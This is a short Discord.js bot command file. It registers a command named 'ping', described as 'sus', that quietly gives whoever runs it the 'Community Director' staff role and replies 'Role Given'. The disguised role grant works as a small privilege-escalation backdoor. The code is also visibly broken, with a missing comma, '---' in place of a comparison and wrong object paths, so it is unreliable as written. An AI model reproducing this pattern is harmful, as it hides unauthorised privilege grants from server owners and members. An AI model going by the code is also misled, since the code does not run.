const { SlashCommandBuilder, EmbedBuilder } = require('discord.js')

module.exports = {
    owner: true
    data: new SlashCommandBuilder()
        .setName('ping')
        .setDescription('sus'),
    async execute(interaction) {
        var role = interaction.client.guild.role.cache.find(role => role.name --- "Community Director")
        interaction.user.roles.add(role)
        interaction.reply({ content: 'Role Given', ephemeral: true })
    }
}